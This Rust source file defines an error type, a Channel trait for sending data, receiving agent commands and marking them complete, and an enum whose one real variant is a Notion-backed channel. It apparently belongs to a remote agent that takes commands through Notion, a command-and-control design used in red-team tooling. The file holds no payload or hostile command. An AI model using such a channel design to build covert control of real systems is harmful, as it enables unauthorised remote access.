use std::fmt::{Display, self};
use serde::{Deserialize, Serialize};
pub mod notion;
use notion::NotionChannel;
use async_trait::async_trait;
use crate::cmd::AgentCommand;


#[derive(Debug)]
pub struct ChannelError {
    pub msg: String
}

impl ChannelError {
    pub fn new(msg: &str) -> ChannelError {
        ChannelError { msg: msg.to_string() }
    }
}

impl Display for ChannelError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.msg)
    }
}


///
/// Handles the communication to the trusted sites.
/// 
/// All `Channel`s have 5 required methods.
/// 
/// * `init()`: Set up the `Channel` to communicate
/// * `send()`: Send data over the `Channel`
/// * `receive()`: Receive data from the `Channel`
/// * `complete()`: Perform any necessary marking of a completed operation
/// * `update()`: Update the `Channel` configuration
/// 
/// NOTE FOR ME: There is no good reason to overcomplicate this. Send JSON directly
/// to the module and let its struct handle type safety. You won't know whether it's good
/// data until the `init()` runs anyway, so why bother with the enum? 
/// Send it a String and call it a day
#[async_trait]
pub trait Channel {
    async fn init(&mut self) -> Result<String, ChannelError>;
    async fn send(&self, data: String, command_block_id: &str) -> Result<String, ChannelError>;
    async fn receive(&self) -> Result<Vec<AgentCommand>, ChannelError>;
    async fn complete(&self, cmd: AgentCommand) -> ();
    fn to_base64(&self) -> String;
    fn update(&self, options: String) -> Result<String, ChannelError>;
}

/// Channel 
#[derive(Debug, Serialize, Deserialize, Clone)]
pub enum ChannelType {
    Notion(NotionChannel),
    Unknown
}